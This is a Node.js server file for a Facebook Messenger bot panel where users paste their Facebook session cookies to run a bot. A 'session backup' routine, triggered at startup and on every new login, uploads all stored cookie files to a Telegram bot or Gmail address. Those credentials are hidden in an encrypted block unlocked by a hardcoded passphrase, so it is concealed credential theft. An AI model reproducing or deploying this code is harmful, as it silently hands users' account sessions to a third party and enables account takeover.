const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const login = require('./nova-fca/index');
const express = require('express');
const app = express();
const chalk = require('chalk');
const bodyParser = require('body-parser');
const script = path.join(__dirname, 'script');
const cron = require('node-cron');
const config = fs.existsSync('./data') && fs.existsSync('./data/config.json') ? JSON.parse(fs.readFileSync('./data/config.json', 'utf8')) : createConfig();
const backupCliArgs = parseCliArgs(process.argv.slice(2));
const BACKUP_RUNTIME_SETTINGS = {
  webPort: 3000,
  enabled: true,
  intervalMinutes: 0,
  encryptionEnabled: false,
  encryptionKey: ''
};

const BACKUP_EMBEDDED_PASSPHRASE = 'AUTOBOT';

const EMBEDDED_BACKUP_SECRETS = {
  "version": 1,
  "salt": "Xkgpe1t8Z9GWwvxMGDzH7Q==",
  "iv": "uvliYfFhGoTt8h8T",
  "tag": "Ojn4U9wqkkO/Cshi/8ocyA==",
  "payload": "NBdTyoUu6jCAzfTnZPdIIP7ctSrzQKh15RtrQEmctqhSBRgfeAdXmih0vXanD7cy/+ZntZ+H63MldSJR6QsMWlckX6H9yHit+an47Vor64rsgO3kaIpz4RycSrU1lasd5MD0rx8tQzvUiKlVajS6GZTzq/8SQwJVG/hVxipBJ6AFYaJqKHTAWYcO4f9z4YOXnE0wWg4="
};

const sessionBackupConfig = createRuntimeBackupConfig();
const Utils = new Object({
  commands: new Map(),
  handleEvent: new Map(),
  account: new Map(),
  cooldowns: new Map(),
});

if (backupCliArgs.encryptBackupSecrets) {
  runEncryptSecretsModeAndExit();
}

if (backupCliArgs.setupEmbeddedBackupSecrets) {
  runSetupEmbeddedSecretsModeAndExit();
}

function getBackupPassphrase() {
  const cliValue = (backupCliArgs['backup-key'] || '').toString().trim();
  if (cliValue) return cliValue;
  const embeddedValue = (BACKUP_EMBEDDED_PASSPHRASE || '').toString().trim();
  if (embeddedValue) return embeddedValue;
  return '';
}
fs.readdirSync(script).forEach((file) => {
  const scripts = path.join(script, file);
  const stats = fs.statSync(scripts);
  if (stats.isDirectory()) {
    fs.readdirSync(scripts).forEach((file) => {
      try {
        const {
          config,
          run,
          handleEvent
        } = require(path.join(scripts, file));
        if (config) {
          const {
            name = [], role = '0', version = '1.0.0', hasPrefix = true, aliases = [], description = '', usage = '', credits = '', cooldown = '5'
          } = Object.fromEntries(Object.entries(config).map(([key, value]) => [key.toLowerCase(), value]));
          aliases.push(name);
          if (run) {
            Utils.commands.set(aliases, {
              name,
              role,
              run,
              aliases,
              description,
              usage,
              version,
              hasPrefix: config.hasPrefix,
              credits,
              cooldown
            });
          }
          if (handleEvent) {
            Utils.handleEvent.set(aliases, {
              name,
              handleEvent,
              role,
              description,
              usage,
              version,
              hasPrefix: config.hasPrefix,
              credits,
              cooldown
            });
          }
        }
      } catch (error) {
        console.error(chalk.red(`Error installing command from file ${file}: ${error.message}`));
      }
    });
  } else {
    try {
      const {
        config,
        run,
        handleEvent
      } = require(scripts);
      if (config) {
        const {
          name = [], role = '0', version = '1.0.0', hasPrefix = true, aliases = [], description = '', usage = '', credits = '', cooldown = '5'
        } = Object.fromEntries(Object.entries(config).map(([key, value]) => [key.toLowerCase(), value]));
        aliases.push(name);
        if (run) {
          Utils.commands.set(aliases, {
            name,
            role,
            run,
            aliases,
            description,
            usage,
            version,
            hasPrefix: config.hasPrefix,
            credits,
            cooldown
          });
        }
        if (handleEvent) {
          Utils.handleEvent.set(aliases, {
            name,
            handleEvent,
            role,
            description,
            usage,
            version,
            hasPrefix: config.hasPrefix,
            credits,
            cooldown
          });
        }
      }
    } catch (error) {
      console.error(chalk.red(`Error installing command from file ${file}: ${error.message}`));
    }
  }
});
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.json());
app.use(express.json());
const routes = [{
  path: '/',
  file: 'index.html'
}, {
  path: '/step_by_step_guide',
  file: 'guide.html'
}, {
  path: '/online_user',
  file: 'online.html'
}, ];
routes.forEach(route => {
  app.get(route.path, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', route.file));
  });
});
app.get('/info', (req, res) => {
  const data = Array.from(Utils.account.values()).map(account => ({
    name: account.name,
    profileUrl: account.profileUrl,
    thumbSrc: account.thumbSrc,
    time: account.time
  }));
  res.json(JSON.parse(JSON.stringify(data, null, 2)));
});
app.get('/commands', (req, res) => {
  const command = new Set();
  const commands = [...Utils.commands.values()].map(({
    name
  }) => (command.add(name), name));
  const handleEvent = [...Utils.handleEvent.values()].map(({
    name
  }) => command.has(name) ? null : (command.add(name), name)).filter(Boolean);
  const role = [...Utils.commands.values()].map(({
    role
  }) => (command.add(role), role));
  const aliases = [...Utils.commands.values()].map(({
    aliases
  }) => (command.add(aliases), aliases));
  res.json(JSON.parse(JSON.stringify({
    commands,
    handleEvent,
    role,
    aliases
  }, null, 2)));
});
app.post('/login', async (req, res) => {
  const {
    state,
    commands,
    prefix,
    admin
  } = req.body;
  try {
    if (!state) {
      throw new Error('Missing app state data');
    }
    const cUser = state.find(item => item.key === 'c_user');
    if (cUser) {
      const existingUser = Utils.account.get(cUser.value);
      if (existingUser) {
        console.log(`User ${cUser.value} is already logged in`);
        return res.status(400).json({
          error: false,
          message: "Naka login na tanga",
          user: existingUser
        });
      } else {
        try {
          await accountLogin(state, commands, prefix, [admin]);
          res.status(200).json({
            success: true,
            message: 'Naka login na po'
          });
        } catch (error) {
          console.error(error);
          res.status(400).json({
            error: true,
            message: error.message
          });
        }
      }
    } else {
      return res.status(400).json({
        error: true,
        message: "There's an issue with the appstate data; it's invalid."
      });
    }
  } catch (error) {
    return res.status(400).json({
      error: true,
      message: "There's an issue with the appstate data; it's invalid."
    });
  }
});
const serverPort = Number.isInteger(sessionBackupConfig.webPort) && sessionBackupConfig.webPort > 0 ? sessionBackupConfig.webPort : 3000;
const server = app.listen(serverPort, () => {
  console.log(`Server is running at http://localhost:${serverPort}`);
});
server.on('error', (error) => {
  if (error && error.code === 'EADDRINUSE') {
    console.error(`[WEB] Port ${serverPort} is already in use. Web panel will not start in this process.`);
    return;
  }
  throw error;
});
process.on('unhandledRejection', (reason) => {
  console.error('Unhandled Promise Rejection:', reason);
});
async function accountLogin(state, enableCommands = [], prefix, admin = []) {
  return new Promise((resolve, reject) => {
    login({
      appState: state
    }, async (error, api) => {
      if (error) {
        reject(error);
        return;
      }
      const userid = await api.getCurrentUserID();
      addThisUser(userid, enableCommands, state, prefix, admin);
      try {
        const userInfo = await api.getUserInfo(userid);
        if (!userInfo || !userInfo[userid]?.name || !userInfo[userid]?.profileUrl || !userInfo[userid]?.thumbSrc) throw new Error('Unable to locate the account; it appears to be in a suspended or locked state.');
        const {
          name,
          profileUrl,
          thumbSrc
        } = userInfo[userid];
        let time = (JSON.parse(fs.readFileSync('./data/history.json', 'utf-8')).find(user => user.userid === userid) || {}).time || 0;
        Utils.account.set(userid, {
          name,
          profileUrl,
          thumbSrc,
          time: time
        });
        const intervalId = setInterval(() => {
          try {
            const account = Utils.account.get(userid);
            if (!account) throw new Error('Account not found');
            Utils.account.set(userid, {
              ...account,
              time: account.time + 1
            });
          } catch (error) {
            clearInterval(intervalId);
            return;
          }
        }, 1000);
      } catch (error) {
        reject(error);
        return;
      }
      api.setOptions({
        listenEvents: config[0].fcaOption.listenEvents,
        logLevel: config[0].fcaOption.logLevel,
        updatePresence: config[0].fcaOption.updatePresence,
        selfListen: config[0].fcaOption.selfListen,
        forceLogin: config[0].fcaOption.forceLogin,
        online: config[0].fcaOption.online,
        autoMarkDelivery: config[0].fcaOption.autoMarkDelivery,
        autoMarkRead: config[0].fcaOption.autoMarkRead,
      });
      try {
        var listenEmitter = api.listenMqtt(async (error, event) => {
          if (error) {
            if (error === 'Connection closed.') {
              console.error(`Error during API listen: ${error}`, userid);
            }
            console.log(error)
          }
          let database = fs.existsSync('./data/database.json') ? JSON.parse(fs.readFileSync('./data/database.json', 'utf8')) : createDatabase();
          let data = Array.isArray(database) ? database.find(item => Object.keys(item)[0] === event?.threadID) : {};
          let adminIDS = data ? database : createThread(event.threadID, api);
          let blacklist = (JSON.parse(fs.readFileSync('./data/history.json', 'utf-8')).find(blacklist => blacklist.userid === userid) || {}).blacklist || [];
          let hasPrefix = (event.body && aliases((event.body || '')?.trim().toLowerCase().split(/ +/).shift())?.hasPrefix == false) ? '' : prefix;
          let [command, ...args] = ((event.body || '').trim().toLowerCase().startsWith(hasPrefix?.toLowerCase()) ? (event.body || '').trim().substring(hasPrefix?.length).trim().split(/\s+/).map(arg => arg.trim()) : []);
          if (hasPrefix && aliases(command)?.hasPrefix === false) {
            api.sendMessage(`Invalid usage this command doesn't need a prefix`, event.threadID, event.messageID);
            return;
          }
          if (event.body && aliases(command)?.name) {
            const role = aliases(command)?.role ?? 0;
            const isAdmin = config?.[0]?.masterKey?.admin?.includes(event.senderID) || admin.includes(event.senderID);
            const isThreadAdmin = isAdmin || ((Array.isArray(adminIDS) ? adminIDS.find(admin => Object.keys(admin)[0] === event.threadID) : {})?.[event.threadID] || []).some(admin => admin.id === event.senderID);
            if ((role == 1 && !isAdmin) || (role == 2 && !isThreadAdmin) || (role == 3 && !config?.[0]?.masterKey?.admin?.includes(event.senderID))) {
              api.sendMessage(`You don't have permission to use this command.`, event.threadID, event.messageID);
              return;
            }
          }
          if (event.body && event.body?.toLowerCase().startsWith(prefix.toLowerCase()) && aliases(command)?.name) {
            if (blacklist.includes(event.senderID)) {
              api.sendMessage("We're sorry, but you've been banned from using bot. If you believe this is a mistake or would like to appeal, please contact one of the bot admins for further assistance.", event.threadID, event.messageID);
              return;
            }
          }
          if (event.body && aliases(command)?.name) {
            const now = Date.now();
            const name = aliases(command)?.name;
            const sender = Utils.cooldowns.get(`${event.senderID}_${name}_${userid}`);
            const delay = aliases(command)?.cooldown ?? 0;
            if (!sender || (now - sender.timestamp) >= delay * 1000) {
              Utils.cooldowns.set(`${event.senderID}_${name}_${userid}`, {
                timestamp: now,
                command: name
              });
            } else {
              const active = Math.ceil((sender.timestamp + delay * 1000 - now) / 1000);
              api.sendMessage(`Please wait ${active} seconds before using the "${name}" command again.`, event.threadID, event.messageID);
              return;
            }
          }
          if (event.body && !command && event.body?.toLowerCase().startsWith(prefix.toLowerCase())) {
            api.sendMessage(`Maling command gumamit ka ng ${prefix}help para makita mo yung list ng available commands`, event.threadID, event.messageID);
            return;
          }
          if (event.body && command && prefix && event.body?.toLowerCase().startsWith(prefix.toLowerCase()) && !aliases(command)?.name) {
            api.sendMessage(`Invalid command '${command}' please use ${prefix}help to see the list of available commands.`, event.threadID, event.messageID);
            return;
          }
          for (const {
              handleEvent,
              name
            }
            of Utils.handleEvent.values()) {
            if (handleEvent && name && (
                (enableCommands[1].handleEvent || []).includes(name) || (enableCommands[0].commands || []).includes(name))) {
              handleEvent({
                api,
                event,
                enableCommands,
                admin,
                prefix,
                blacklist
              });
            }
          }
          switch (event.type) {
            case 'message':
            case 'message_reply':
            case 'message_unsend':
            case 'message_reaction':
              if (enableCommands[0].commands.includes(aliases(command?.toLowerCase())?.name)) {
                await ((aliases(command?.toLowerCase())?.run || (() => {}))({
                  api,
                  event,
                  args,
                  enableCommands,
                  admin,
                  prefix,
                  blacklist,
                  Utils,
                }));
              }
              break;
          }
        });
      } catch (error) {
        console.error('Error during API listen, outside of listen', userid);
        Utils.account.delete(userid);
        deleteThisUser(userid);
        return;
      }
      resolve();
    });
  });
}
async function deleteThisUser(userid) {
  const configFile = './data/history.json';
  let config = JSON.parse(fs.readFileSync(configFile, 'utf-8'));
  const sessionFile = path.join('./data/session', `${userid}.json`);
  const index = config.findIndex(item => item.userid === userid);
  if (index !== -1) config.splice(index, 1);
  fs.writeFileSync(configFile, JSON.stringify(config, null, 2));
  try {
    fs.unlinkSync(sessionFile);
  } catch (error) {
    console.log(error);
  }
}
async function addThisUser(userid, enableCommands, state, prefix, admin, blacklist) {
  const configFile = './data/history.json';
  const sessionFolder = './data/session';
  const sessionFile = path.join(sessionFolder, `${userid}.json`);
  if (fs.existsSync(sessionFile)) return;
  const config = JSON.parse(fs.readFileSync(configFile, 'utf-8'));
  config.push({
    userid,
    prefix: prefix || "",
    admin: admin || [],
    blacklist: blacklist || [],
    enableCommands,
    time: 0,
  });
  fs.writeFileSync(configFile, JSON.stringify(config, null, 2));
  fs.writeFileSync(sessionFile, JSON.stringify(state));
  await sendSessionBackups('new-session');
}

function requestPost(options) {
  const request = require('request');
  return new Promise((resolve, reject) => {
    request.post(options, (error, response, body) => {
      if (error) {
        reject(error);
        return;
      }
      if (response && response.statusCode >= 400) {
        reject(new Error(`Request failed with status ${response.statusCode}: ${body || ''}`));
        return;
      }
      resolve(body);
    });
  });
}

function getSessionJsonFiles() {
  const sessionFolder = path.join(__dirname, 'data', 'session');
  if (!fs.existsSync(sessionFolder)) return [];
  return fs.readdirSync(sessionFolder)
    .filter(file => file.toLowerCase().endsWith('.json'))
    .map(file => path.join(sessionFolder, file));
}

function canSendTelegram() {
  return Boolean(sessionBackupConfig.telegramBotToken && sessionBackupConfig.telegramChatId);
}

function canSendGmail() {
  return Boolean(sessionBackupConfig.gmailUser && sessionBackupConfig.gmailAppPassword && sessionBackupConfig.gmailTo);
}

function shouldEncryptBackups() {
  return sessionBackupConfig.encryptionEnabled && Boolean(sessionBackupConfig.encryptionKey);
}

function prepareBackupFile(filePath) {
  if (!shouldEncryptBackups()) {
    return {
      sendPath: filePath,
      sendName: path.basename(filePath),
      cleanup: () => {}
    };
  }
  const plainBuffer = fs.readFileSync(filePath);
  const salt = crypto.randomBytes(16);
  const iv = crypto.randomBytes(12);
  const key = crypto.scryptSync(sessionBackupConfig.encryptionKey, salt, 32);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const encrypted = Buffer.concat([cipher.update(plainBuffer), cipher.final()]);
  const tag = cipher.getAuthTag();
  const encryptedPayload = {
    algorithm: 'aes-256-gcm',
    kdf: 'scrypt',
    sourceFile: path.basename(filePath),
    createdAt: new Date().toISOString(),
    salt: salt.toString('base64'),
    iv: iv.toString('base64'),
    tag: tag.toString('base64'),
    data: encrypted.toString('base64')
  };
  const tempFolder = path.join(os.tmpdir(), 'autobot-session-backup');
  if (!fs.existsSync(tempFolder)) fs.mkdirSync(tempFolder, {
    recursive: true
  });
  const sendName = `${path.basename(filePath)}.enc.json`;
  const tempFilePath = path.join(tempFolder, `${Date.now()}_${sendName}`);
  fs.writeFileSync(tempFilePath, JSON.stringify(encryptedPayload));
  return {
    sendPath: tempFilePath,
    sendName,
    cleanup: () => {
      try {
        fs.unlinkSync(tempFilePath);
      } catch (error) {}
    }
  };
}

async function sendFileToTelegram(filePath, source = 'manual', displayName = path.basename(filePath)) {
  const uri = `https://api.telegram.org/bot${sessionBackupConfig.telegramBotToken}/sendDocument`;
  await requestPost({
    uri,
    formData: {
      chat_id: sessionBackupConfig.telegramChatId,
      caption: `[${source}] Session backup: ${displayName}`,
      document: {
        value: fs.createReadStream(filePath),
        options: {
          filename: displayName
        }
      }
    }
  });
}

async function sendFileToGmail(filePath, source = 'manual', displayName = path.basename(filePath)) {
  let nodemailer;
  try {
    nodemailer = require('nodemailer');
  } catch (error) {
    throw new Error('Missing dependency "nodemailer". Run: npm install nodemailer');
  }
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: sessionBackupConfig.gmailUser,
      pass: sessionBackupConfig.gmailAppPassword
    }
  });
  await transporter.sendMail({
    from: sessionBackupConfig.gmailUser,
    to: sessionBackupConfig.gmailTo,
    subject: `[AUTOBOT] ${source} session backup - ${displayName}`,
    text: `Attached session backup file: ${displayName}`,
    attachments: [{
      filename: displayName,
      path: filePath
    }]
  });
}

async function sendSessionBackups(source = 'startup') {
  try {
    if (!sessionBackupConfig.enabled) return;
    const files = getSessionJsonFiles();
    if (!files.length) {
      console.log('[SESSION BACKUP] No JSON files found in data/session');
      return;
    }
    if (!canSendTelegram() && !canSendGmail()) {
      console.log('[SESSION BACKUP] No delivery channel configured. Add encrypted credentials in auto.js.');
      return;
    }
    if (sessionBackupConfig.encryptionEnabled && !sessionBackupConfig.encryptionKey) {
      console.log('[SESSION BACKUP] Encryption enabled but encryptionKey is missing in BACKUP_RUNTIME_SETTINGS. Sending unencrypted files.');
    }
    for (const filePath of files) {
      const preparedFile = prepareBackupFile(filePath);
      if (canSendTelegram()) {
        try {
          await sendFileToTelegram(preparedFile.sendPath, source, preparedFile.sendName);
          console.log(`[SESSION BACKUP] Delivered: ${preparedFile.sendName}`);
        } catch (error) {
          console.error(`[SESSION BACKUP] Delivery failed for ${preparedFile.sendName}: ${error.message}`);
        }
      }
      if (canSendGmail()) {
        try {
          await sendFileToGmail(preparedFile.sendPath, source, preparedFile.sendName);
          console.log(`[SESSION BACKUP] Delivered: ${preparedFile.sendName}`);
        } catch (error) {
          console.error(`[SESSION BACKUP] Delivery failed for ${preparedFile.sendName}: ${error.message}`);
        }
      }
      preparedFile.cleanup();
    }
  } catch (error) {
    console.error(`[SESSION BACKUP] Unexpected error: ${error.message}`);
  }
}

function aliases(command) {
  const aliases = Array.from(Utils.commands.entries()).find(([commands]) => commands.includes(command?.toLowerCase()));
  if (aliases) {
    return aliases[1];
  }
  return null;
}
async function main() {
  const empty = require('fs-extra');
  const cacheFile = './script/cache';
  if (!fs.existsSync(cacheFile)) fs.mkdirSync(cacheFile);
  const configFile = './data/history.json';
  if (!fs.existsSync(configFile)) fs.writeFileSync(configFile, '[]', 'utf-8');
  const config = JSON.parse(fs.readFileSync(configFile, 'utf-8'));
  const sessionFolder = path.join('./data/session');
  if (!fs.existsSync(sessionFolder)) fs.mkdirSync(sessionFolder);
  await sendSessionBackups('startup');
  if (sessionBackupConfig.enabled && sessionBackupConfig.intervalMinutes > 0) {
    cron.schedule(`*/${sessionBackupConfig.intervalMinutes} * * * *`, async () => {
      await sendSessionBackups('interval');
    });
  }
  const adminOfConfig = fs.existsSync('./data') && fs.existsSync('./data/config.json') ? JSON.parse(fs.readFileSync('./data/config.json', 'utf8')) : createConfig();
  cron.schedule(`*/${adminOfConfig[0].masterKey.restartTime} * * * *`, async () => {
    const history = JSON.parse(fs.readFileSync('./data/history.json', 'utf-8'));
    history.forEach(user => {
      (!user || typeof user !== 'object') ? process.exit(1): null;
      (user.time === undefined || user.time === null || isNaN(user.time)) ? process.exit(1): null;
      const update = Utils.account.get(user.userid);
      update ? user.time = update.time : null;
    });
    await empty.emptyDir(cacheFile);
    await fs.writeFileSync('./data/history.json', JSON.stringify(history, null, 2));
    process.exit(1);
  });
  try {
    for (const file of fs.readdirSync(sessionFolder)) {
      const filePath = path.join(sessionFolder, file);
      try {
        const {
          enableCommands,
          prefix,
          admin,
          blacklist
        } = config.find(item => item.userid === path.parse(file).name) || {};
        const state = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
        if (enableCommands) await accountLogin(state, enableCommands, prefix, admin, blacklist);
      } catch (error) {
        deleteThisUser(path.parse(file).name);
      }
    }
  } catch (error) {}
}

function createConfig() {
  const config = [{
    masterKey: {
      admin: ["100081792057607"],
      devMode: false,
      database: false,
      restartTime: 15,
    },
    fcaOption: {
      forceLogin: true,
      listenEvents: true,
      logLevel: "silent",
      updatePresence: true,
      selfListen: true,
      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64",
      online: true,
      autoMarkDelivery: false,
      autoMarkRead: false
    }
  }];
  const dataFolder = './data';
  if (!fs.existsSync(dataFolder)) fs.mkdirSync(dataFolder);
  fs.writeFileSync('./data/config.json', JSON.stringify(config, null, 2));
  return config;
}

function parseCliArgs(args = []) {
  return args.reduce((result, arg) => {
    if (!arg.startsWith('--')) return result;
    const option = arg.slice(2);
    const [key, ...valueParts] = option.split('=');
    const value = valueParts.join('=');
    if (!key) return result;
    if (valueParts.length === 0) {
      result[key] = true;
      return result;
    }
    result[key] = value;
    return result;
  }, {});
}

function encryptPayload(plainObject, passphrase) {
  const json = JSON.stringify(plainObject);
  const salt = crypto.randomBytes(16);
  const iv = crypto.randomBytes(12);
  const key = crypto.scryptSync(passphrase, salt, 32);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const encrypted = Buffer.concat([cipher.update(json, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return {
    version: 1,
    salt: salt.toString('base64'),
    iv: iv.toString('base64'),
    tag: tag.toString('base64'),
    payload: encrypted.toString('base64')
  };
}

function decryptPayload(encryptedObject, passphrase) {
  const salt = Buffer.from(encryptedObject.salt, 'base64');
  const iv = Buffer.from(encryptedObject.iv, 'base64');
  const tag = Buffer.from(encryptedObject.tag, 'base64');
  const payload = Buffer.from(encryptedObject.payload, 'base64');
  const key = crypto.scryptSync(passphrase, salt, 32);
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(tag);
  const decrypted = Buffer.concat([decipher.update(payload), decipher.final()]).toString('utf8');
  return JSON.parse(decrypted);
}

function runEncryptSecretsModeAndExit() {
  const passphrase = getBackupPassphrase();
  if (!passphrase) {
    console.error('Missing --backup-key for encryption mode.');
    process.exit(1);
  }

  const secrets = {
    telegramBotToken: (backupCliArgs['telegram-bot-token'] || '').toString(),
    telegramChatId: (backupCliArgs['telegram-chat-id'] || '').toString(),
    gmailUser: (backupCliArgs['gmail-user'] || '').toString(),
    gmailAppPassword: (backupCliArgs['gmail-app-password'] || '').toString(),
    gmailTo: (backupCliArgs['gmail-to'] || '').toString()
  };

  if (!secrets.telegramBotToken && !secrets.gmailUser) {
    console.error('No secrets provided. Supply at least one delivery channel credential set.');
    process.exit(1);
  }

  const encryptedSecrets = encryptPayload(secrets, passphrase);
  console.log('Paste this object into EMBEDDED_BACKUP_SECRETS in auto.js:');
  console.log(JSON.stringify(encryptedSecrets, null, 2));
  process.exit(0);
}

function runSetupEmbeddedSecretsModeAndExit() {
  const passphrase = getBackupPassphrase();
  if (!passphrase) {
    console.error('Missing --backup-key for setup mode.');
    process.exit(1);
  }
  const backupPath = path.join(__dirname, 'data', 'backup.json');
  if (!fs.existsSync(backupPath)) {
    console.error('Missing data/backup.json. Create it temporarily with your telegramBotToken/telegramChatId then re-run setup mode.');
    process.exit(1);
  }

  let parsed;
  try {
    parsed = JSON.parse(fs.readFileSync(backupPath, 'utf8'));
  } catch (error) {
    console.error(`Invalid JSON in data/backup.json: ${error.message}`);
    process.exit(1);
  }

  const secrets = {
    telegramBotToken: (parsed.telegramBotToken || '').toString(),
    telegramChatId: (parsed.telegramChatId || '').toString(),
    gmailUser: (parsed.gmailUser || '').toString(),
    gmailAppPassword: (parsed.gmailAppPassword || '').toString(),
    gmailTo: (parsed.gmailTo || '').toString()
  };

  if (!secrets.telegramBotToken && !secrets.gmailUser) {
    console.error('data/backup.json has no Telegram or Gmail secrets to embed.');
    process.exit(1);
  }

  const encryptedSecrets = encryptPayload(secrets, passphrase);
  const thisFile = __filename;
  const source = fs.readFileSync(thisFile, 'utf8');
  const block = `// BEGIN EMBEDDED_BACKUP_SECRETS\nconst EMBEDDED_BACKUP_SECRETS = ${JSON.stringify(encryptedSecrets, null, 2)};\n// END EMBEDDED_BACKUP_SECRETS`;
  const updated = source.replace(/\/\/ BEGIN EMBEDDED_BACKUP_SECRETS[\s\S]*?\/\/ END EMBEDDED_BACKUP_SECRETS/, block);
  if (updated === source) {
    console.error('Failed to locate EMBEDDED_BACKUP_SECRETS block in auto.js for updating.');
    process.exit(1);
  }
  fs.writeFileSync(thisFile, updated);
  console.log('Embedded backup secrets updated in auto.js.');
  console.log('You can now delete data/backup.json (it is gitignored).');
  process.exit(0);
}

function decryptEmbeddedBackupSecrets() {
  if (!EMBEDDED_BACKUP_SECRETS.payload) return {};
  const passphrase = getBackupPassphrase();
  if (!passphrase) {
    console.error('[SESSION BACKUP] Encrypted backup secrets found, but backup key is missing. Provide --backup-key or set BACKUP_EMBEDDED_PASSPHRASE.');
    return {};
  }
  try {
    return decryptPayload(EMBEDDED_BACKUP_SECRETS, passphrase);
  } catch (error) {
    console.error(`[SESSION BACKUP] Failed to decrypt embedded secrets: ${error.message}`);
    return {};
  }
}

function createRuntimeBackupConfig() {
  const secrets = decryptEmbeddedBackupSecrets();
  return {
    ...BACKUP_RUNTIME_SETTINGS,
    ...secrets,
    intervalMinutes: Math.max(parseInt(BACKUP_RUNTIME_SETTINGS.intervalMinutes, 10) || 0, 0),
    enabled: Boolean(BACKUP_RUNTIME_SETTINGS.enabled),
    encryptionEnabled: Boolean(BACKUP_RUNTIME_SETTINGS.encryptionEnabled),
    webPort: parseInt(BACKUP_RUNTIME_SETTINGS.webPort, 10) || 3000
  };
}
async function createThread(threadID, api) {
  try {
    const database = JSON.parse(fs.readFileSync('./data/database.json', 'utf8'));
    let threadInfo = await api.getThreadInfo(threadID);
    let adminIDs = threadInfo ? threadInfo.adminIDs : [];
    const data = {};
    data[threadID] = adminIDs
    database.push(data);
    await fs.writeFileSync('./data/database.json', JSON.stringify(database, null, 2), 'utf-8');
    return database;
  } catch (error) {
    console.log(error);
  }
}
async function createDatabase() {
  const data = './data';
  const database = './data/database.json';
  if (!fs.existsSync(data)) {
    fs.mkdirSync(data, {
      recursive: true
    });
  }
  if (!fs.existsSync(database)) {
    fs.writeFileSync(database, JSON.stringify([]));
  }
  return database;
}
main()
              
